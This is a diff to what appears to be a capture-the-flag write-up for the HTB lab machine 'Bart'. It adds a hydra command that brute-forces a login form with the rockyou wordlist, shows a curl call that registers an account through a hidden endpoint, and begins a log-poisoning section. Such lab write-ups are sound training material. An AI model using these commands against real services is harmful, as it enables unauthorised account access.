@@ -108,11 +108,18 @@ Looking at the code, it looks like the version running here removed the `registe
 ▶ curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=hardyboy&passwd=password"
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236633671-13443158-ce89-4071-b9b5-0cf2855fb313.png)
+![image](https://user-images.githubusercontent.com/83878909/236633708-78ee83d4-b630-4ff4-99b6-bb379a9cbd30.png)
 
 
 ### Brute-Force Credentials (Optional)
+ - Brute-force password for user `Harvey`.
 ```CSS
-
+hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-form-post "/simple_chat/login_form.php:uname=^USER^&^passwd=^PASS^&submit=Login:Password"
 ```
 
+
 ---
+
+## Log Poisoning
+  - Vulnerable Code
+![image](https://user-images.githubusercontent.com/83878909/236633855-abf4ab67-f0d7-413e-abfa-a0ce7907cf27.png)
